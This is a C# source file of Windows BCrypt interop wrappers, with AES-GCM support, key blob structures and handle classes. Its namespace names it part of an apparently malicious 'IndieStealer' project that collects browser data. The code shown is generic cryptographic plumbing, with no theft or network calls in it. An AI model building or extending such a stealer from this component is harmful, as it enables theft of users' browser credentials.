using System;
using System.Collections;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using IndieStealer.Collect.Browsers;

namespace IndieStealer.Collect.AesGcm.AES
{
	public static unsafe class BCrypt
	{
		
		[DllImport("BCrypt", CharSet = CharSet.Unicode, ExactSpelling = true, SetLastError = true)]
		public static extern NTSTATUS BCryptOpenAlgorithmProvider(out SafeAlgorithmHandle phAlgorithm, string pszAlgId, string pszImplementation, BCryptOpenAlgorithmProviderFlags dwFlags);
		
		[DllImport("BCrypt", SetLastError = true)]
		public unsafe static extern NTSTATUS BCryptEncrypt(SafeKeyHandle hKey, byte* pbInput, int cbInput, void* pPaddingInfo, byte* pbIV, int cbIV, byte* pbOutput, int cbOutput, out int pcbResult, BCryptEncryptFlags dwFlags);
		[DllImport("BCrypt", SetLastError = true)]
		public unsafe static extern NTSTATUS BCryptDecrypt(SafeKeyHandle hKey, byte* pbInput, int cbInput, void* pPaddingInfo, byte* pbIV, int cbIV, byte* pbOutput, int cbOutput, out int pcbResult, BCryptEncryptFlags dwFlags);
		
		[DllImport("BCrypt", SetLastError = true)]
		public static extern NTSTATUS BCryptGenerateSymmetricKey(SafeAlgorithmHandle hAlgorithm, out SafeKeyHandle phKey, byte[] pbKeyObject, int cbKeyObject, byte[] pbSecret, int cbSecret, BCryptGenerateSymmetricKeyFlags flags = BCryptGenerateSymmetricKeyFlags.None);
		[DllImport("BCrypt", ExactSpelling = true, SetLastError = true)]
		public static extern NTSTATUS BCryptFinalizeKeyPair(SafeKeyHandle hKey, BCryptFinalizeKeyPairFlags dwFlags = BCryptFinalizeKeyPairFlags.None);
		[DllImport("BCrypt", CharSet = CharSet.Unicode, ExactSpelling = true, SetLastError = true)]
		public static extern NTSTATUS BCryptImportKey(SafeAlgorithmHandle hAlgorithm, SafeKeyHandle hImportKey, [MarshalAs(21)] string pszBlobType, out SafeKeyHandle phKey, byte[] pbKeyObject, int cbKeyObject, byte[] pbInput, int cbInput, BCryptImportKeyFlags dwFlags = BCryptImportKeyFlags.None);
		[DllImport("BCrypt", CharSet = CharSet.Unicode, ExactSpelling = true, SetLastError = true)]
		public static extern NTSTATUS BCryptImportKeyPair(SafeAlgorithmHandle hAlgorithm, SafeKeyHandle hImportKey, [MarshalAs(21)] string pszBlobType, out SafeKeyHandle phKey, byte[] pbInput, int cbInput, BCryptImportKeyPairFlags dwFlags);
		[DllImport("BCrypt", CharSet = CharSet.Unicode, ExactSpelling = true, SetLastError = true)]
		public static extern NTSTATUS BCryptExportKey(SafeKeyHandle hKey, SafeKeyHandle hExportKey, [MarshalAs(21)] string pszBlobType, [MarshalAs(42, SizeParamIndex = 5)][Out] byte[] pbOutput, int cbOutput, out int pcbResult, BCryptExportKeyFlags dwFlags = BCryptExportKeyFlags.None);
		[DllImport("BCrypt", ExactSpelling = true, SetLastError = true)]
		public static extern NTSTATUS BCryptSecretAgreement(SafeKeyHandle privateKey, SafeKeyHandle publicKey, out SafeSecretHandle secret, BCryptSecretAgreementFlags flags = BCryptSecretAgreementFlags.None);
		[DllImport("BCrypt", CharSet = CharSet.Unicode, ExactSpelling = true, SetLastError = true)]
		public static extern NTSTATUS BCryptDeriveKey(SafeSecretHandle sharedSecret, string keyDerivationFunction, [In] ref BCryptBufferDesc kdfParameters, [MarshalAs(42)][Out] byte[] derivedKey, int derivedKeySize, out int resultSize, BCryptDeriveKeyFlags flags);
		[DllImport("BCrypt", CharSet = CharSet.Unicode, ExactSpelling = true, SetLastError = true)]
		public unsafe static extern NTSTATUS BCryptSetProperty(SafeHandle hObject, string pszProperty, byte* pbInput, int cbInput, BCryptSetPropertyFlags dwFlags = BCryptSetPropertyFlags.None);
		[DllImport("BCrypt", CharSet = CharSet.Unicode, ExactSpelling = true, SetLastError = true)]
		public static extern NTSTATUS BCryptSetProperty(SafeHandle hObject, string pszProperty, string pbInput, int cbInput, BCryptSetPropertyFlags dwFlags = BCryptSetPropertyFlags.None);
		[DllImport("BCrypt", CharSet = CharSet.Unicode, ExactSpelling = true, SetLastError = true)]
		public static extern NTSTATUS BCryptGetProperty(SafeHandle hObject, string property, [MarshalAs(42)][Out] byte[] output, int outputSize, out int resultSize, BCryptGetPropertyFlags flags = BCryptGetPropertyFlags.None);
		[DllImport("BCrypt", SetLastError = true)]
		public static extern NTSTATUS BCryptGenRandom(SafeAlgorithmHandle hAlgorithm, byte[] pbBuffer, int cbBuffer, BCryptGenRandomFlags flags = BCryptGenRandomFlags.None);
		[DllImport("BCrypt", SetLastError = true)]
		public static extern unsafe void BCryptFreeBuffer(void* pvBuffer);
		[DllImport("BCrypt", ExactSpelling = true, SetLastError = true)]
		private static extern NTSTATUS BCryptCloseAlgorithmProvider(IntPtr algorithmHandle, BCryptCloseAlgorithmProviderFlags flags = BCryptCloseAlgorithmProviderFlags.None);
		[DllImport("BCrypt", SetLastError = true)]
		private static extern NTSTATUS BCryptDestroyHash(IntPtr hHash);
		[DllImport("BCrypt", ExactSpelling = true, SetLastError = true)]
		private static extern NTSTATUS BCryptDestroyKey(IntPtr hKey);
		[DllImport("BCrypt", ExactSpelling = true, SetLastError = true)]
		private static extern NTSTATUS BCryptDestroySecret(IntPtr hSecret);
		public static SafeAlgorithmHandle BCryptOpenAlgorithmProvider(string pszAlgId, string pszImplementation = null, BCryptOpenAlgorithmProviderFlags dwFlags = BCryptOpenAlgorithmProviderFlags.None)
		{
			SafeAlgorithmHandle result;
			BCryptOpenAlgorithmProvider(out result, pszAlgId, pszImplementation, dwFlags).ThrowOnError();
			return result;
		}
		public static SafeKeyHandle BCryptGenerateSymmetricKey(SafeAlgorithmHandle algorithm, byte[] secret, byte[] keyObject = null, BCryptGenerateSymmetricKeyFlags flags = BCryptGenerateSymmetricKeyFlags.None)
		{
			SafeKeyHandle result;
			BCryptGenerateSymmetricKey(algorithm, out result, keyObject, (keyObject != null) ? keyObject.Length : 0, secret, secret.Length, flags).ThrowOnError();
			return result;
		}

		public unsafe static NTSTATUS BCryptEncrypt(SafeKeyHandle key, ArraySegment<byte>? input, void* paddingInfo, ArraySegment<byte>? iv, ArraySegment<byte>? output, out int outputLength, BCryptEncryptFlags flags)
		{
			ArraySegment<byte> buffer = input ?? default(ArraySegment<byte>);
			ArraySegment<byte> buffer2 = iv ?? default(ArraySegment<byte>);
			ArraySegment<byte> buffer3 = output ?? default(ArraySegment<byte>);
			EnsureNotNullOrEmpty(ref buffer);
			EnsureNotNullOrEmpty(ref buffer2);
			EnsureNotNullOrEmpty(ref buffer3);
			fixed (byte* ptr = &buffer.Array[buffer.Offset])
			{
				fixed (byte* ptr2 = &buffer3.Array[buffer3.Offset])
				{
					fixed (byte* ptr3 = &buffer2.Array[buffer2.Offset])
					{
						return BCryptEncrypt(key, ArrayOrOriginalNull(buffer, ptr), buffer.Count, paddingInfo, ArrayOrOriginalNull(buffer2, ptr3), buffer2.Count, ArrayOrOriginalNull(buffer3, ptr2), buffer3.Count, out outputLength, flags);
					}
				}
			}
		}


		public static void BCryptSetProperty(SafeHandle hObject, string propertyName, string propertyValue, BCryptSetPropertyFlags flags = BCryptSetPropertyFlags.None)
		{
			BCryptSetProperty(hObject, propertyName, propertyValue, (propertyValue != null) ? ((propertyValue.Length + 1) * 2) : 0, flags).ThrowOnError();
		}

		public static ArraySegment<byte> BCryptGetProperty(SafeHandle hObject, string propertyName, BCryptGetPropertyFlags flags = BCryptGetPropertyFlags.None)
		{
			int num;
			BCryptGetProperty(hObject, propertyName, null, 0, out num, flags).ThrowOnError();
			byte[] array = new byte[num];
			BCryptGetProperty(hObject, propertyName, array, array.Length, out num, flags).ThrowOnError();
			return new ArraySegment<byte>(array, 0, num);
		}
		public unsafe static T BCryptGetProperty<T>(SafeHandle hObject, string propertyName, BCryptGetPropertyFlags flags = BCryptGetPropertyFlags.None) where T : struct
		{
			ArraySegment<byte> arraySegment = BCryptGetProperty(hObject, propertyName, flags);
			fixed (byte* array = arraySegment.Array)
			{
				return (T)Marshal.PtrToStructure(new IntPtr(array + arraySegment.Offset), typeof(T));
			}
		}
		private static void EnsureNotNullOrEmpty(ref ArraySegment<byte> buffer)
		{
			if (buffer.Array == null)
			{
				buffer = new ArraySegment<byte>(NonEmptyArrayReplacesNull, 0, 0);
				return;
			}
			if (buffer.Array.Length == 0)
			{
				buffer = new ArraySegment<byte>(NonEmptyArrayReplacesEmpty, 0, 0);
			}
		}
		private static ArraySegment<byte> ArraySegmentFor(byte[] buffer)
		{
			if (buffer != null)
			{
				return new ArraySegment<byte>(buffer);
			}
			return default(ArraySegment<byte>);
		}
		private unsafe static byte* ArrayOrOriginalNull(ArraySegment<byte> buffer, byte* pointer)
		{
			if (buffer.Array != NonEmptyArrayReplacesNull)
			{
				return pointer;
			}
			return null;
		}

		public unsafe static NTSTATUS BCryptDecrypt(SafeKeyHandle hKey, byte[] pbInput, int cbInput, void* pPaddingInfo, byte[] pbIV, int cbIV, byte[] pbOutput, int cbOutput, out int pcbResult, BCryptEncryptFlags dwFlags)
		{
			fixed (byte* ptr = pbOutput)
			{
				fixed (byte* ptr2 = pbIV)
				{
					fixed (byte* ptr3 = pbInput)
					{
						return BCryptDecrypt(hKey, ptr3, cbInput, pPaddingInfo, ptr2, cbIV, ptr, cbOutput, out pcbResult, dwFlags);
					}
				}
			}
		}

		private static readonly byte[] NonEmptyArrayReplacesNull = new byte[1];
		private static readonly byte[] NonEmptyArrayReplacesEmpty = new byte[1];
		public static class AlgorithmIdentifiers
		{
			public const string BCRYPT_3DES_ALGORITHM = "3DES";
			public const string BCRYPT_3DES_112_ALGORITHM = "3DES_112";
			public const string BCRYPT_AES_ALGORITHM = "AES";
			public const string BCRYPT_AES_CMAC_ALGORITHM = "AES-CMAC";
			public const string BCRYPT_AES_GMAC_ALGORITHM = "AES-GMAC";
			public const string BCRYPT_CAPI_KDF_ALGORITHM = "CAPI_KDF";
			public const string BCRYPT_DES_ALGORITHM = "DES";
			public const string BCRYPT_DESX_ALGORITHM = "DESX";
			public const string BCRYPT_DH_ALGORITHM = "DH";
			public const string BCRYPT_DSA_ALGORITHM = "DSA";
			public const string BCRYPT_ECDH_P256_ALGORITHM = "ECDH_P256";
			public const string BCRYPT_ECDH_P384_ALGORITHM = "ECDH_P384";
			public const string BCRYPT_ECDH_P521_ALGORITHM = "ECDH_P521";
			public const string BCRYPT_ECDSA_P256_ALGORITHM = "ECDSA_P256";
			public const string BCRYPT_ECDSA_P384_ALGORITHM = "ECDSA_P384";
			public const string BCRYPT_ECDSA_P521_ALGORITHM = "ECDSA_P521";
			public const string BCRYPT_MD2_ALGORITHM = "MD2";
			public const string BCRYPT_MD4_ALGORITHM = "MD4";
			public const string BCRYPT_MD5_ALGORITHM = "MD5";
			public const string BCRYPT_RC2_ALGORITHM = "RC2";
			public const string BCRYPT_RC4_ALGORITHM = "RC4";
			public const string BCRYPT_RNG_ALGORITHM = "RNG";
			public const string BCRYPT_RNG_DUAL_EC_ALGORITHM = "DUALECRNG";
			public const string BCRYPT_RNG_FIPS186_DSA_ALGORITHM = "FIPS186DSARNG";
			public const string BCRYPT_RSA_ALGORITHM = "RSA";
			public const string BCRYPT_RSA_SIGN_ALGORITHM = "RSA_SIGN";
			public const string BCRYPT_SHA1_ALGORITHM = "SHA1";
			public const string BCRYPT_SHA256_ALGORITHM = "SHA256";
			public const string BCRYPT_SHA384_ALGORITHM = "SHA384";
			public const string BCRYPT_SHA512_ALGORITHM = "SHA512";
			public const string BCRYPT_SP800108_CTR_HMAC_ALGORITHM = "SP800_108_CTR_HMAC";
			public const string BCRYPT_SP80056A_CONCAT_ALGORITHM = "SP800_56A_CONCAT";
			public const string BCRYPT_PBKDF2_ALGORITHM = "PBKDF2";
		}
		public class AsymmetricKeyBlobTypes
		{
			protected AsymmetricKeyBlobTypes()
			{
			}
			public const string BCRYPT_PUBLIC_KEY_BLOB = "PUBLICBLOB";
			public const string BCRYPT_PRIVATE_KEY_BLOB = "PRIVATEBLOB";
			public const string BCRYPT_DH_PUBLIC_BLOB = "DHPUBLICBLOB";
			public const string BCRYPT_DH_PRIVATE_BLOB = "DHPRIVATEBLOB";
			public const string LEGACY_DH_PUBLIC_BLOB = "CAPIDHPUBLICBLOB";
			public const string LEGACY_DH_PRIVATE_BLOB = "CAPIDHPRIVATEBLOB";
			public const string BCRYPT_DSA_PUBLIC_BLOB = "DSAPUBLICBLOB";
			public const string BCRYPT_DSA_PRIVATE_BLOB = "DSAPRIVATEBLOB";
			public const string LEGACY_DSA_PUBLIC_BLOB = "CAPIDSAPUBLICBLOB";
			public const string LEGACY_DSA_PRIVATE_BLOB = "CAPIDSAPRIVATEBLOB";
			public const string LEGACY_DSA_V2_PUBLIC_BLOB = "V2CAPIDSAPUBLICBLOB";
			public const string LEGACY_DSA_V2_PRIVATE_BLOB = "V2CAPIDSAPRIVATEBLOB";
			public const string BCRYPT_ECCPUBLIC_BLOB = "ECCPUBLICBLOB";
			public const string BCRYPT_ECCPRIVATE_BLOB = "ECCPRIVATEBLOB";
			public const string BCRYPT_RSAPUBLIC_BLOB = "RSAPUBLICBLOB";
			public const string BCRYPT_RSAPRIVATE_BLOB = "RSAPRIVATEBLOB";
			public const string BCRYPT_RSAFULLPRIVATE_BLOB = "RSAFULLPRIVATEBLOB";
			public const string LEGACY_RSAPUBLIC_BLOB = "CAPIPUBLICBLOB";
			public const string LEGACY_RSAPRIVATE_BLOB = "CAPIPRIVATEBLOB";
		}
		[Flags]
		public enum AuthModeFlags
		{
			None = 0,
			BCRYPT_AUTH_MODE_CHAIN_CALLS_FLAG = 1,
			BCRYPT_AUTH_MODE_IN_PROGRESS_FLAG = 2
		}
		public struct BCryptBuffer
		{
			public int cbBuffer;
			public BufferType BufferType;
			public unsafe void* pvBuffer;
		}
		public struct BCryptBufferDesc
		{
			public const uint BCRYPTBUFFER_VERSION = 0U;
			public uint ulVersion;
			public int cBuffers;
			public unsafe BCryptBuffer* pBuffers;
		}
		[Flags]
		public enum BCryptCloseAlgorithmProviderFlags
		{
			None = 0
		}
		[Flags]
		public enum BCryptEnumAlgorithmsFlags
		{
			None = 0
		}
		[Flags]
		public enum BCryptCreateHashFlags
		{
			None = 0,
			BCRYPT_HASH_REUSABLE_FLAG = 32
		}
		[Flags]
		public enum BCryptDeriveKeyFlags
		{
			None = 0,
			KDF_USE_SECRET_AS_HMAC_KEY_FLAG = 1
		}
		[Flags]
		public enum BCryptEncryptFlags
		{
			None = 0,
			BCRYPT_BLOCK_PADDING = 1,
			BCRYPT_PAD_NONE = 1,
			BCRYPT_PAD_PKCS1 = 2,
			BCRYPT_PAD_OAEP = 4
		}
		[Flags]
		public enum BCryptExportKeyFlags
		{
			None = 0
		}
		[Flags]
		public enum BCryptFinalizeKeyPairFlags
		{
			None = 0
		}
		[Flags]
		public enum BCryptFinishHashFlags
		{
			None = 0
		}
		[Flags]
		public enum BCryptGenerateKeyPairFlags
		{
			None = 0
		}
		[Flags]
		public enum BCryptGenerateSymmetricKeyFlags
		{
			None = 0
		}
		[Flags]
		public enum BCryptGenRandomFlags
		{
			None = 0,
			UseEntropyInBuffer = 1,
			UseSystemPreferredRNG = 2
		}
		[Flags]
		public enum BCryptGetPropertyFlags
		{
			None = 0
		}
		[Flags]
		public enum BCryptHashDataFlags
		{
			None = 0
		}
		[Flags]
		public enum BCryptImportKeyFlags
		{
			None = 0
		}
		[Flags]
		public enum BCryptImportKeyPairFlags
		{
			None = 0,
			BCRYPT_NO_KEY_VALIDATION = 8
		}
		[Flags]
		public enum BCryptOpenAlgorithmProviderFlags
		{
			None = 0,
			AlgorithmHandleHmac = 1,
			HashReusable = 2
		}
		[Flags]
		public enum BCryptSecretAgreementFlags
		{
			None = 0
		}
		[Flags]
		public enum BCryptSetPropertyFlags
		{
			None = 0
		}
		[Flags]
		public enum BCryptSignHashFlags
		{
			None = 0,
			BCRYPT_PAD_PKCS1 = 2,
			BCRYPT_PAD_PSS = 8
		}
		[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
		public struct BCRYPT_ALGORITHM_IDENTIFIER
		{
			public unsafe char* pszName;
			public InterfaceIdentifiers dwClass;
			public Flags dwFlags;
			public enum Flags : uint
			{
				None
			}
		}
		public struct BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO
		{
			public static BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO Create()
			{
				return new BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO
				{
					cbSize = Marshal.SizeOf(typeof(BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO)),
					dwInfoVersion = 1U
				};
			}			
			public const uint BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO_VERSION = 1U;
			public int cbSize;
			public uint dwInfoVersion;
			public unsafe byte* pbNonce;
			public int cbNonce;
			public unsafe byte* pbAuthData;
			public int cbAuthData;
			public unsafe byte* pbTag;
			public int cbTag;
			public unsafe byte* pbMacContext;
			public int cbMacContext;
			public int cbAAD;
			public long cbData;
			public AuthModeFlags dwFlags;
		}
		public struct BCRYPT_AUTH_TAG_LENGTHS_STRUCT : IEnumerable<int>, IEnumerable
		{
			public IEnumerator<int> GetEnumerator()
			{
				if (dwIncrement > 0)
				{
					for (int tagLength = dwMinLength; tagLength <= dwMaxLength; tagLength += dwIncrement)
					{
						yield return tagLength;
					}
				}
				else
				{
					yield return dwMinLength;
				}
			}
			IEnumerator IEnumerable.GetEnumerator()
			{
				return GetEnumerator();
			}
			public int dwMinLength;
			public int dwMaxLength;
			public int dwIncrement;
		}

		public struct BCRYPT_DSA_KEY_BLOB_V2
		{
			public MagicNumber dwMagic;
			public int cbKey;
			public HASHALGORITHM_ENUM hashAlgorithm;
			public DSAFIPSVERSION_ENUM standardVersion;
			public int cbSeedLength;
			public int cbGroupSize;
			public int Count;
			public enum MagicNumber : uint
			{
				BCRYPT_DSA_PUBLIC_MAGIC_V2 = 843206724U,
				BCRYPT_DSA_PRIVATE_MAGIC_V2 = 844517444U
			}
		}
		public struct BCRYPT_DSA_KEY_BLOB
		{
			public MagicNumber dwMagic;
			public int cbKey;
			public int Count;
			[MarshalAs(30, SizeConst = 20)]
			public byte[] Seed;
			[MarshalAs(30, SizeConst = 20)]
			public byte[] q;
			public enum MagicNumber : uint
			{
				BCRYPT_DSA_PUBLIC_MAGIC = 1112560452U,
				BCRYPT_DSA_PRIVATE_MAGIC = 1448104772U
			}
		}
		public struct BCRYPT_KEY_DATA_BLOB_HEADER
		{
			public const uint BCRYPT_KEY_DATA_BLOB_VERSION1 = 1U;
			public MagicNumber dwMagic;
			public uint dwVersion;
			public int cbKeyData;
			public enum MagicNumber : uint
			{
				BCRYPT_KEY_DATA_BLOB_MAGIC = 1296188491U
			}
		}

		public struct BCRYPT_ECCKEY_BLOB
		{
			public MagicNumber dwMagic;
			public int cbKey;
			public enum MagicNumber : uint
			{
				BCRYPT_ECDH_PUBLIC_P256_MAGIC = 827016005U,
				BCRYPT_ECDH_PRIVATE_P256_MAGIC = 843793221U,
				BCRYPT_ECDH_PUBLIC_P384_MAGIC = 860570437U,
				BCRYPT_ECDH_PRIVATE_P384_MAGIC = 877347653U,
				BCRYPT_ECDH_PUBLIC_P521_MAGIC = 894124869U,
				BCRYPT_ECDH_PRIVATE_P521_MAGIC = 910902085U,
				BCRYPT_ECDSA_PUBLIC_P256_MAGIC = 827540293U,
				BCRYPT_ECDSA_PRIVATE_P256_MAGIC = 844317509U,
				BCRYPT_ECDSA_PUBLIC_P384_MAGIC = 861094725U,
				BCRYPT_ECDSA_PRIVATE_P384_MAGIC = 877871941U,
				BCRYPT_ECDSA_PUBLIC_P521_MAGIC = 894649157U,
				BCRYPT_ECDSA_PRIVATE_P521_MAGIC = 911426373U
			}
		}


		public struct BCRYPT_RSAKEY_BLOB
		{
			public MagicNumber Magic;
			public int BitLength;
			public int cbPublicExp;
			public int cbModulus;
			public int cbPrime1;
			public int cbPrime2;
			public enum MagicNumber : uint
			{
				BCRYPT_RSAPUBLIC_MAGIC = 826364754U,
				BCRYPT_RSAPRIVATE_MAGIC = 843141970U,
				BCRYPT_RSAFULLPRIVATE_MAGIC = 859919186U
			}
		}
		public struct BCRYPT_DH_KEY_BLOB
		{
			public MagicNumber dwMagic;
			public int cbKey;
			public enum MagicNumber : uint
			{
				BCRYPT_DH_PUBLIC_MAGIC = 1112557636U,
				BCRYPT_DH_PRIVATE_MAGIC = 1448101956U
			}
		}
		public enum BufferType
		{
			KDF_HASH_ALGORITHM,
			KDF_SECRET_PREPEND,
			KDF_SECRET_APPEND,
			KDF_HMAC_KEY,
			KDF_TLS_PRF_LABEL,
			KDF_TLS_PRF_SEED,
			KDF_SECRET_HANDLE,
			KDF_TLS_PRF_PROTOCOL,
			KDF_ALGORITHMID,
			KDF_PARTYUINFO,
			KDF_PARTYVINFO,
			KDF_SUPPPUBINFO,
			KDF_SUPPPRIVINFO,
			KDF_LABEL,
			KDF_CONTEXT,
			KDF_SALT,
			KDF_ITERATION_COUNT
		}
		public static class ChainingModes
		{
			public const string Cbc = "ChainingModeCBC";
			public const string Ccm = "ChainingModeCCM";
			public const string Cfb = "ChainingModeCFB";
			public const string Ecb = "ChainingModeECB";
			public const string Gcm = "ChainingModeGCM";
			public const string NotApplicable = "ChainingModeN/A";
		}
		public enum DSAFIPSVERSION_ENUM
		{
			DSA_FIPS186_2,
			DSA_FIPS186_3
		}
		public struct EccKeyBlob
		{
			public EccKeyBlob(byte[] keyBlob)
			{
				Magic = (EccKeyBlobMagicNumbers)BitConverter.ToUInt32(keyBlob, 0);
				KeyLength = BitConverter.ToInt32(keyBlob, 4);
			}
			public EccKeyBlobMagicNumbers Magic;
			public int KeyLength;
		}
		public enum EccKeyBlobMagicNumbers : uint
		{
			BCRYPT_ECDH_PUBLIC_P256_MAGIC = 827016005U,
			BCRYPT_ECDH_PRIVATE_P256_MAGIC = 843793221U,
			BCRYPT_ECDH_PUBLIC_P384_MAGIC = 860570437U,
			BCRYPT_ECDH_PRIVATE_P384_MAGIC = 877347653U,
			BCRYPT_ECDH_PUBLIC_P521_MAGIC = 894124869U,
			BCRYPT_ECDH_PRIVATE_P521_MAGIC = 910902085U,
			BCRYPT_ECDSA_PUBLIC_P256_MAGIC = 827540293U,
			BCRYPT_ECDSA_PRIVATE_P256_MAGIC = 844317509U,
			BCRYPT_ECDSA_PUBLIC_P384_MAGIC = 861094725U,
			BCRYPT_ECDSA_PRIVATE_P384_MAGIC = 877871941U,
			BCRYPT_ECDSA_PUBLIC_P521_MAGIC = 894649157U,
			BCRYPT_ECDSA_PRIVATE_P521_MAGIC = 911426373U
		}
		public enum HASHALGORITHM_ENUM
		{
			DSA_HASH_ALGORITHM_SHA1,
			DSA_HASH_ALGORITHM_SHA256,
			DSA_HASH_ALGORITHM_SHA512
		}
		public enum InterfaceIdentifiers : uint
		{
			BCRYPT_CIPHER_INTERFACE = 1U,
			BCRYPT_HASH_INTERFACE,
			BCRYPT_ASYMMETRIC_ENCRYPTION_INTERFACE,
			BCRYPT_SECRET_AGREEMENT_INTERFACE,
			BCRYPT_SIGNATURE_INTERFACE,
			BCRYPT_RNG_INTERFACE,
			BCRYPT_KEY_DERIVATION_INTERFACE
		}
		
		public static class PropertyNames
		{
			public const string BCRYPT_OBJECT_LENGTH = "ObjectLength";
			public const string BCRYPT_ALGORITHM_NAME = "AlgorithmName";
			public const string BCRYPT_PROVIDER_HANDLE = "ProviderHandle";
			public const string BCRYPT_CHAINING_MODE = "ChainingMode";
			public const string BCRYPT_BLOCK_LENGTH = "BlockLength";
			public const string BCRYPT_KEY_LENGTH = "KeyLength";
			public const string BCRYPT_KEY_OBJECT_LENGTH = "KeyObjectLength";
			public const string BCRYPT_KEY_STRENGTH = "KeyStrength";
			public const string BCRYPT_KEY_LENGTHS = "KeyLengths";
			public const string BCRYPT_BLOCK_SIZE_LIST = "BlockSizeList";
			public const string BCRYPT_EFFECTIVE_KEY_LENGTH = "EffectiveKeyLength";
			public const string BCRYPT_HASH_LENGTH = "HashDigestLength";
			public const string BCRYPT_HASH_OID_LIST = "HashOIDList";
			public const string BCRYPT_PADDING_SCHEMES = "PaddingSchemes";
			public const string BCRYPT_SIGNATURE_LENGTH = "SignatureLength";
			public const string BCRYPT_HASH_BLOCK_LENGTH = "HashBlockLength";
			public const string BCRYPT_AUTH_TAG_LENGTH = "AuthTagLength";
			public const string BCRYPT_MESSAGE_BLOCK_LENGTH = "MessageBlockLength";
			public const string BCRYPT_DH_PARAMETERS = "DHParameters";
			public const string BCRYPT_DSA_PARAMETERS = "DSAParameters";
			public const string BCRYPT_INITIALIZATION_VECTOR = "IV";
			public const string BCRYPT_PRIMITIVE_TYPE = "PrimitiveType";
			public const string BCRYPT_IS_KEYED_HASH = "IsKeyedHash";
			public const string BCRYPT_IS_REUSABLE_HASH = "IsReusableHash";
		}
		public class SafeAlgorithmHandle : SafeHandle
		{
			public SafeAlgorithmHandle() : base(IntPtr.Zero, true)
			{
			}
			public SafeAlgorithmHandle(IntPtr preexistingHandle, bool ownsHandle = true) : base(IntPtr.Zero, ownsHandle)
			{
				SetHandle(preexistingHandle);
			}
			public override bool IsInvalid
			{
				get
				{
					return handle == IntPtr.Zero;
				}
			}
			protected override bool ReleaseHandle()
			{
				return BCryptCloseAlgorithmProvider(handle).Value == NTSTATUS.Code.STATUS_SUCCESS;
			}
			public static readonly SafeAlgorithmHandle Null = new SafeAlgorithmHandle();
		}
		public class SafeHashHandle : SafeHandle
		{
			public SafeHashHandle() : base(IntPtr.Zero, true)
			{
			}
			public SafeHashHandle(IntPtr preexistingHandle, bool ownsHandle = true) : base(IntPtr.Zero, ownsHandle)
			{
				SetHandle(preexistingHandle);
			}
			public override bool IsInvalid
			{
				get
				{
					return handle == IntPtr.Zero;
				}
			}
			protected override bool ReleaseHandle()
			{
				return BCryptDestroyHash(handle).Value == NTSTATUS.Code.STATUS_SUCCESS;
			}
			public static readonly SafeHashHandle Null = new SafeHashHandle();
		}
		public class SafeKeyHandle : SafeHandle
		{
			public SafeKeyHandle() : base(IntPtr.Zero, true)
			{
			}
			public SafeKeyHandle(IntPtr preexistingHandle, bool ownsHandle = true) : base(IntPtr.Zero, ownsHandle)
			{
				SetHandle(preexistingHandle);
			}
			public override bool IsInvalid
			{
				get
				{
					return handle == IntPtr.Zero;
				}
			}
			protected override bool ReleaseHandle()
			{
				return BCryptDestroyKey(handle).Value == NTSTATUS.Code.STATUS_SUCCESS;
			}
			public static readonly SafeKeyHandle Null = new SafeKeyHandle();
		}
		public class SafeSecretHandle : SafeHandle
		{
			public SafeSecretHandle() : base(IntPtr.Zero, true)
			{
			}
			public SafeSecretHandle(IntPtr preexistingHandle, bool ownsHandle = true) : base(IntPtr.Zero, ownsHandle)
			{
				SetHandle(preexistingHandle);
			}
			public override bool IsInvalid
			{
				get
				{
					return handle == IntPtr.Zero;
				}
			}
			protected override bool ReleaseHandle()
			{
				return BCryptDestroySecret(handle).Value == NTSTATUS.Code.STATUS_SUCCESS;
			}
			public static readonly SafeSecretHandle Null = new SafeSecretHandle();
		}
		public class SymmetricKeyBlobTypes
		{
			protected SymmetricKeyBlobTypes()
			{
			}
			public const string BCRYPT_AES_WRAP_KEY_BLOB = "Rfc3565KeyWrapBlob";
			public const string BCRYPT_KEY_DATA_BLOB = "KeyDataBlob";
			public const string BCRYPT_OPAQUE_KEY_BLOB = "OpaqueKeyBlob";
		}
		[Flags]
		public enum AlgorithmOperations : uint
		{
			BCRYPT_CIPHER_OPERATION = 1U,
			BCRYPT_HASH_OPERATION = 2U,
			BCRYPT_ASYMMETRIC_ENCRYPTION_OPERATION = 4U,
			BCRYPT_SECRET_AGREEMENT_OPERATION = 8U,
			BCRYPT_SIGNATURE_OPERATION = 16U,
			BCRYPT_RNG_OPERATION = 32U,
			BCRYPT_KEY_DERIVATION_OPERATION = 64U
		}
	}
}
